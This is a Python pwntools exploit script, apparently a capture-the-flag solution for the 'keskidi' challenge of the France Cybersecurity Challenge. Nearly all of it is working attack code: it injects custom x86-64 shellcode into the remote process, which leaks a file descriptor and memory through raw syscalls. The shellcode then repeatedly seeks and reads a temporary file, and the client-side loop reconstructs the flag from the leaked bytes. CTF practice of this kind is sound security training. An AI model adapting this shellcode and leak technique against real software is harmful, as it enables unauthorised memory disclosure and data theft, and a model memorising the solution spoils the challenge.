#!/usr/bin/env python3

from pwn import *
from time import sleep
import socket

exe = ELF("./keskidi")

context.binary = exe.path


def conn():
    if args.REMOTE:
        r = remote("challenges.france-cybersecurity-challenge.fr", 2103)
    elif args.TRACE:
        r  = process(["strace", "-f", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit
""")


def my_recv(r, size):
	rep = b''
	while len(rep)<size:
		rep += r.recv(1)
	return rep


def main():
	global r
	r = conn()


	# random_data 0x00104060
	# rsp contains : 0x001013c0
	# offset 0x2ca0
	# tmp_file descriptor : 0x00104040
	# offset 0x2c80

	shellcode="""

	mov r10, QWORD PTR [rsp]
    add r10, 0x2c88
    mov r12, r10
    add r12, 0x08
    mov QWORD PTR [r10], 0x0
    mov QWORD PTR [r12], 10000


	// leak tmp_file descriptor
	push 1
    pop rdi
    xor edx, edx
    mov rdx, 0x1
    mov rsi, QWORD PTR [rsp]
    add rsi, 0x2c80
    push SYS_write
    pop rax
    syscall

    push 1
    pop rdi
    xor edx, edx
    mov rdx, 0x1000
    mov rsi, QWORD PTR [rsp]
    add rsi, 0x2ca0
    push SYS_write
    pop rax
    syscall

    lab:
	// fseek(fd,-0x1,1)
	mov rdi, 4
	mov rsi, -0x1
	mov rdx, 1
	mov rax, 0x8
	syscall

	
	// read(fd,rsp,0x5)
	mov rsi, rsp
	mov rdx, 0x5
    xor rax, rax
	syscall

	// write(1, rsp, 0x5)
    mov rdi, 1
    mov rax, 1
    syscall

    //nanosleep
    mov rdi, r10
    mov rsi, r12
    mov rax, 35
    syscall


    jmp lab
	"""

	if len(asm(shellcode)) > 256:
		log.error("shellcode too long")
		exit(-1)

	r.send(asm(shellcode))

	fd = my_recv(r,0x1)
	log.info(f"File descriptor {fd}")

	random_datas_tmp = my_recv(r,0x1000)
	log.info(f"Random data received : {len(random_datas_tmp)}")
	if len(random_datas_tmp) != 0x1000:
		log.error("not enought random")
		exit(-1)

	flag = ''

	known = []

	last_char = 0


	while len(flag) < 70:
		rep = my_recv(r,0x5)
		if rep[0]==0:
			for i in range(0x1000-0x4):
				if random_datas_tmp[i:i+0x4] == rep[1:5]:
					c = random_datas_tmp[i-1]
					if c!= last_char:
						flag += chr(c)
						#print(flag)
						known.append(i)
						last_char=c
	print(flag)

if __name__ == "__main__":
    main()